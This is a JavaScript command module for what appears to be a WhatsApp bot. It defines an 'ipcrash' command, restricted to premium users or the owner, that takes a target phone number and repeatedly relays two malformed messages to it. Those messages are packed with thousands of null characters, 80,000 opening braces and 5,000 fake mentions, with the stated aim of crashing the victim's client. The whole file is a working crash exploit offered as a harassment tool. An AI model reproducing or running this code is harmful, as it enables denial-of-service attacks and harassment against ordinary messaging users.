import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'ipcrash',
    aliases: ['ipkiller', 'ipban'],
    category: 'bug',
    description: 'IP crash attack - intensive invisible relays',
    usage: 'ipcrash <number>',
    cooldown: 60,
    ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ Usage: .ipcrash <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '⚡', key: message.key } });
        await sock.sendMessage(from, { text: `⚡ IP crash on ${num}` }, { quoted: message });
        const payloads = [
            { ephemeralMessage: { message: { interactiveMessage: { header: { title: "\u0000".repeat(5000), hasMediaAttachment: false }, body: { text: "\u0000".repeat(5000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(80000) }, contextInfo: { mentionedJid: Array.from({ length: 5000 }, (_, i) => `ip${i}@s.whatsapp.net`) } } } } },
            { viewOnceMessage: { message: { orderMessage: { orderId: "0".repeat(3000), itemCount: 999999, status: "DECLINED", surface: "BUFFERS", message: "\u0000".repeat(3000), orderTitle: "\u0000".repeat(3000), sellerJid: t, token: "\u0000".repeat(3000) }, messageContextInfo: { deviceListMetadata: {} } } } }
        ];
        for (let i = 0; i < 20; i++) {
            for (const payload of payloads) {
                try { await sock.relayMessage(t, payload, {}); } catch {}
            }
            await new Promise(r => setTimeout(r, 50));
        }
        await sock.sendMessage(from, { text: '✅ IP crash sent' }, { quoted: message });
    }
};
